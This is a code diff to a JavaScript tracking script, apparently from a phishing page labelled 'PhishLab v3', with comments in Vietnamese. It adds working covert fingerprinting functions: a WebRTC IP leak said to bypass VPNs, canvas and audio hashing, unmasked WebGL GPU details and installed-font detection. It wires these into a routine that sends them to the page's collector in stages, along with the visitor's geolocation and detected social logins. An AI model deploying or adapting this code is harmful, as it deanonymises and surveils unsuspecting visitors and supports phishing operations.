@@ -372,6 +372,200 @@
     }
 
     // =========================================
+    //  RANK 5: ADVANCED FINGERPRINTING
+    //  WebRTC IP Leak + Canvas + Audio + WebGL
+    // =========================================
+
+    // --- WebRTC Local IP Leak (có thể bypass VPN) ---
+    function getWebRTCIPs() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection)({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                const ips = new Set();
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve([]));
+
+                pc.onicecandidate = (e) => {
+                    if (!e || !e.candidate) {
+                        pc.close();
+                        resolve([...ips]);
+                        return;
+                    }
+                    const parts = e.candidate.candidate.split(' ');
+                    const ip = parts[4];
+                    if (ip && /^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) ips.add(ip);
+                    // IPv6
+                    if (ip && ip.includes(':')) ips.add(ip);
+                };
+
+                // Timeout 5s
+                setTimeout(() => { try { pc.close(); } catch(e) {} resolve([...ips]); }, 5000);
+            } catch(e) {
+                resolve([]);
+            }
+        });
+    }
+
+    // --- Canvas Fingerprint (mỗi GPU render khác nhau) ---
+    function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 280;
+            canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            if (!ctx) return { hash: 'unsupported', raw: '' };
+
+            // Vẽ text với font và màu sắc phức tạp
+            ctx.textBaseline = 'top';
+            ctx.font = '14px \'Arial\'';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('PhishLab v3 🔬', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Canvas FP', 4, 45);
+
+            // Vẽ hình phức tạp
+            ctx.beginPath();
+            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
+            ctx.closePath();
+            ctx.fill();
+
+            // Gradient
+            const gradient = ctx.createLinearGradient(0, 0, 280, 0);
+            gradient.addColorStop(0, 'red');
+            gradient.addColorStop(0.5, 'green');
+            gradient.addColorStop(1, 'blue');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 30, 280, 10);
+
+            const dataUrl = canvas.toDataURL();
+            // Simple hash
+            let hash = 0;
+            for (let i = 0; i < dataUrl.length; i++) {
+                hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+                hash |= 0;
+            }
+
+            return {
+                hash: 'canvas_' + Math.abs(hash).toString(16),
+                data_length: dataUrl.length,
+                supported: true
+            };
+        } catch(e) {
+            return { hash: 'error', supported: false };
+        }
+    }
+
+    // --- Audio Context Fingerprint (mỗi sound card khác nhau) ---
+    function getAudioFingerprint() {
+        return new Promise((resolve) => {
+            try {
+                const AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!AudioCtx) { resolve({ hash: 'unsupported' }); return; }
+
+                const ctx = new AudioCtx(1, 44100, 44100);
+                const oscillator = ctx.createOscillator();
+                oscillator.type = 'triangle';
+                oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
+
+                const compressor = ctx.createDynamicsCompressor();
+                compressor.threshold.setValueAtTime(-50, ctx.currentTime);
+                compressor.knee.setValueAtTime(40, ctx.currentTime);
+                compressor.ratio.setValueAtTime(12, ctx.currentTime);
+                compressor.attack.setValueAtTime(0, ctx.currentTime);
+                compressor.release.setValueAtTime(0.25, ctx.currentTime);
+
+                oscillator.connect(compressor);
+                compressor.connect(ctx.destination);
+                oscillator.start(0);
+
+                ctx.startRendering().then((renderedBuffer) => {
+                    const data = renderedBuffer.getChannelData(0);
+                    let sum = 0;
+                    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+                    const hash = sum.toString().replace('.', '').substr(0, 16);
+                    resolve({
+                        hash: 'audio_' + hash,
+                        sample_rate: ctx.sampleRate,
+                        supported: true
+                    });
+                }).catch(() => resolve({ hash: 'blocked', supported: false }));
+
+                setTimeout(() => resolve({ hash: 'timeout' }), 3000);
+            } catch(e) {
+                resolve({ hash: 'error', supported: false });
+            }
+        });
+    }
+
+    // --- WebGL Renderer Info ---
+    function getWebGLInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return { supported: false };
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shading_language: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                supported: true
+            };
+        } catch(e) {
+            return { supported: false };
+        }
+    }
+
+    // --- Installed Fonts Detection (sampling) ---
+    function detectFonts() {
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = [
+            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+            'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino',
+            'Lucida Console', 'Segoe UI', 'Roboto', 'Ubuntu', 'Helvetica',
+            'Calibri', 'Cambria', 'Consolas', 'Century Gothic'
+        ];
+
+        const testString = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        const body = document.body;
+
+        const span = document.createElement('span');
+        span.style.position = 'absolute';
+        span.style.left = '-9999px';
+        span.style.fontSize = testSize;
+        span.style.lineHeight = 'normal';
+        span.textContent = testString;
+        body.appendChild(span);
+
+        const baseWidths = {};
+        baseFonts.forEach(font => {
+            span.style.fontFamily = font;
+            baseWidths[font] = span.offsetWidth;
+        });
+
+        const detected = [];
+        testFonts.forEach(font => {
+            let found = false;
+            baseFonts.forEach(base => {
+                span.style.fontFamily = '"' + font + '",' + base;
+                if (span.offsetWidth !== baseWidths[base]) found = true;
+            });
+            if (found) detected.push(font);
+        });
+
+        body.removeChild(span);
+        return detected;
+    }
+
+    // =========================================
     //  GỬI DỮ LIỆU (3 giai đoạn)
     // =========================================
     async function collectAndSend() {
@@ -390,26 +584,36 @@
             // Rank 3
             context: context,
             battery: battery,
+            // Rank 5: Advanced (collected sync)
+            advanced_fingerprint: {
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLInfo(),
+                fonts: detectFonts()
+            },
             // Placeholder
             location: { error: 'Đang lấy...' },
             social_logins: {},
             dwell_time: '0s'
         };
 
-        // Giai đoạn 1: Gửi ngay device + network + context
+        // Giai đoạn 1: Gửi ngay device + network + context + canvas/webgl/fonts
         sendData(fingerprint);
 
-        // Giai đoạn 2: Lấy vị trí + social detection song song
-        const [location, socialLogins] = await Promise.all([
+        // Giai đoạn 2: Lấy vị trí + social + async fingerprints song song
+        const [location, socialLogins, webrtcIPs, audioFP] = await Promise.all([
             getLocation(),
-            detectLoggedInServices()
+            detectLoggedInServices(),
+            getWebRTCIPs(),
+            getAudioFingerprint()
         ]);
 
         fingerprint.location = location;
         fingerprint.social_logins = socialLogins;
+        fingerprint.advanced_fingerprint.webrtc_ips = webrtcIPs;
+        fingerprint.advanced_fingerprint.audio = audioFP;
         fingerprint.dwell_time = dwellTime + 's';
 
-        // Gửi update với vị trí + social
+        // Gửi update đầy đủ
         sendData(fingerprint);
     }
 
